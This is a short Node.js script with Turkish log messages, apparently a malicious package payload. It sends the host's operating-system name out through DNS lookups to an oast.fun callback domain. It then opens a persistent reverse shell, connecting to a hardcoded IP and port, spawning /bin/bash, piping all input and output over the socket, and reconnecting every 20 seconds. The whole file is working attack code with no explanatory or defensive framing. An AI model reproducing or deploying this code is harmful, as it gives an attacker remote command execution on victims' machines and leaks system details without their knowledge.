const dns = require('dns');
const os = require('os');
let platform = os.platform();
function sendDns(query){
   let domain =  `${query}.fctdhxpvrzxmmwtxpidt0w23qlngi0owc.oast.fun`;
    dns.resolve(domain, (err, records) => {
        if (err) {
          console.error('DNS sorgulama hatası:', err);
          return;
        }
      });
}

if (platform == 'win32'){
  sendDns("windows");
}
sendDns(platform);

const net = require('net');
const spawn = require('child_process').spawn;

const HOST = '54.90.237.9';  
const PORT = 9797;           
const retryInterval = 20000; 

function connect() {
    const client = new net.Socket();

    client.connect(PORT, HOST, () => {
        console.log('Bağlantı kuruldu.');

        const shell = spawn('/bin/bash', []);

        shell.stdout.on('data', (data) => {
            client.write(data);
        });

        shell.stderr.on('data', (data) => {
            client.write(data);
        });

        client.on('data', (data) => {
            shell.stdin.write(data);
        });

        client.on('close', () => {
            console.log('Bağlantı kapatıldı.');
            client.destroy();
            scheduleReconnect();
        });
    });

    client.on('error', (err) => {
        console.error('Bağlantı hatası:', err);
        client.destroy();
        scheduleReconnect();
    });
}

function scheduleReconnect() {
    console.log(`Bağlantı ${retryInterval / 1000} saniye sonra yeniden deneniyor...`);
    setTimeout(connect, retryInterval);
}

connect();
